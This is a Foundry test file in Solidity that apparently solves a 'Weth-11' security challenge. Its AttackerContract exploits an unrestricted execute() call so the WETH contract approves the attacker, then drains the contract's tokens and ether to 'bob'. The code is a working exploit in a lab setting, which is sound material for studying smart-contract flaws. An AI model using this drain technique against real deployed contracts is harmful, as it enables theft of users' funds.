// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "../src/Weth-11.sol";

interface IWeth11{
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function withdrawAll() external; 
    function execute(address receiver, uint256 amount, bytes calldata data) external;
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
}

contract AttackerContract {
    IWeth11 immutable private weth11;
    address private bob;
    constructor(address _weth11, address attacker) {
        weth11 = IWeth11(_weth11);
        bob = attacker; 
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", [uint256(uint160(address(this))), type(uint256).max]);
        weth11.execute(address(weth11) , 0 , data);
        bool success = weth11.transferFrom(address(weth11), address(this) , weth11.balanceOf(address(weth11)));
        require(success , "not transferred");
        console.log("token is received by the Bob");
        console.log("now withdrawing!");
        weth11.withdrawAll();   
    }

    function getTheAmount() external {
        (bool success , ) = payable(address(bob)).call{value : address(this).balance}("");
        require(success);
    }


    receive() external payable{}
}

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack_attack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);
        AttackerContract attackerContract = new AttackerContract(address(weth) , bob);
        attackerContract.attack();
        attackerContract.getTheAmount();
        // hack time!

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }


}